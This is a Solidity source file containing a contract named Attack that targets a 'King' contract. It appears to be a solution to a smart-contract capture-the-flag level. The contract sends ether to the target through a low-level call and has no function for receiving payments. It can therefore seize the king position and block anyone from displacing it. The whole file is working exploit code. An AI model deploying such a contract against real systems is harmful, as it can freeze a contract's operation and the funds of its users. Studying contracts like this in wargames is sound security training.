// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./King.sol";

contract Attack {
    King public king;
    address payable public owner;
    bool public sent;

    constructor(address payable _king) public payable {
        king = King(_king);
        owner = msg.sender;
    }

    function withdraw() public {
        owner.transfer(address(this).balance);
    }

    function attack(uint256 amount) public payable {
        (sent, ) = address(king).call.value(amount)("");
    }
}
